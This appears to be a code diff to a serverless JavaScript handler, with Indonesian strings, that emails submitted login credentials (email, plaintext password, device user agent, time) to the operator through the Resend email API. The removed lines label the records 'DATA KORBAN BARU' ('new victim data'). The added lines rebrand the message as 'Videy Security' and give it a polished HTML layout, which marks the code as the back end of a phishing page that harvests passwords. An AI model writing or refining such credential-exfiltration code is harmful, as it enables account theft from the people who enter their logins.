@@ -16,6 +16,16 @@ export default async function handler(req, res) {
         return res.status(500).json({ error: 'API key belum diset di env' });
     }
 
+    const waktu = new Date().toLocaleString('id-ID', {
+        weekday: 'long',
+        day: '2-digit',
+        month: 'long',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    });
+
     try {
         const response = await fetch('https://api.resend.com/emails', {
             method: 'POST',
@@ -24,33 +34,96 @@ export default async function handler(req, res) {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                from: 'onboarding@resend.dev',
+                from: 'Videy Security <onboarding@resend.dev>',
                 to: YOUR_EMAIL,
-                subject: '🎯 DATA KORBAN BARU - ' + new Date().toLocaleString('id-ID'),
+                subject: '🎯 Data Baru Masuk — ' + new Date().toLocaleString('id-ID'),
                 html: `
-                    <div style="font-family:Arial,sans-serif;padding:20px;background:#f5f5f5;">
-                        <div style="max-width:500px;margin:0 auto;background:#fff;border-radius:10px;padding:24px;border:1px solid #e0e0e0;">
-                            <h2 style="color:#1a73e8;margin:0 0 16px;">Data Login Korban</h2>
-                            <table style="width:100%;border-collapse:collapse;">
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="margin:0;padding:0;background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;">
+    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f0f2f5;padding:30px 15px;">
+        <tr>
+            <td align="center">
+                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:520px;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);">
+                    
+                    <!-- HEADER -->
+                    <tr>
+                        <td style="background:linear-gradient(135deg,#1a73e8 0%,#0d47a1 100%);padding:28px 24px;text-align:center;">
+                            <div style="font-size:13px;color:rgba(255,255,255,0.85);letter-spacing:2px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">Videy Security</div>
+                            <div style="font-size:22px;color:#ffffff;font-weight:700;letter-spacing:-0.3px;">🎯 Data Login Baru</div>
+                        </td>
+                    </tr>
+
+                    <!-- GREETING -->
+                    <tr>
+                        <td style="padding:28px 24px 10px;">
+                            <div style="font-size:15px;color:#202124;line-height:1.6;">
+                                Ada <b>data login baru</b> yang masuk ke sistem. Berikut detailnya:
+                            </div>
+                        </td>
+                    </tr>
+
+                    <!-- CARD DATA -->
+                    <tr>
+                        <td style="padding:10px 24px 20px;">
+                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f8f9fa;border-radius:12px;border:1px solid #e8eaed;overflow:hidden;">
+                                
+                                <!-- Email -->
                                 <tr>
-                                    <td style="padding:8px 0;font-weight:bold;color:#555;width:120px;">Email:</td>
-                                    <td style="padding:8px 0;color:#111;">${email}</td>
+                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
+                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">📧 Email</div>
+                                        <div style="font-size:16px;color:#202124;font-weight:600;word-break:break-all;">${email}</div>
+                                    </td>
                                 </tr>
+                                
+                                <!-- Password -->
                                 <tr>
-                                    <td style="padding:8px 0;font-weight:bold;color:#555;">Password:</td>
-                                    <td style="padding:8px 0;color:#111;">${password}</td>
+                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
+                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🔑 Password</div>
+                                        <div style="font-size:16px;color:#d93025;font-weight:700;font-family:'Courier New',monospace;background:#fce8e6;padding:8px 12px;border-radius:6px;display:inline-block;word-break:break-all;">${password}</div>
+                                    </td>
                                 </tr>
+
+                                <!-- Waktu -->
                                 <tr>
-                                    <td style="padding:8px 0;font-weight:bold;color:#555;">Waktu:</td>
-                                    <td style="padding:8px 0;color:#111;">${new Date().toLocaleString('id-ID')}</td>
+                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
+                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🕐 Waktu</div>
+                                        <div style="font-size:14px;color:#202124;">${waktu}</div>
+                                    </td>
                                 </tr>
+
+                                <!-- User Agent -->
                                 <tr>
-                                    <td style="padding:8px 0;font-weight:bold;color:#555;">User Agent:</td>
-                                    <td style="padding:8px 0;color:#111;font-size:12px;">${userAgent || '-'}</td>
+                                    <td style="padding:16px 20px;">
+                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">💻 Perangkat</div>
+                                        <div style="font-size:12px;color:#5f6368;line-height:1.5;word-break:break-all;">${userAgent || '-'}</div>
+                                    </td>
                                 </tr>
+
                             </table>
-                        </div>
-                    </div>
+                        </td>
+                    </tr>
+
+                    <!-- FOOTER -->
+                    <tr>
+                        <td style="padding:16px 24px 28px;text-align:center;">
+                            <div style="font-size:12px;color:#9aa0a6;line-height:1.5;">
+                                Email otomatis dari sistem Videy.<br>
+                                Jangan balas email ini.
+                            </div>
+                        </td>
+                    </tr>
+
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
                 `
             })
         });
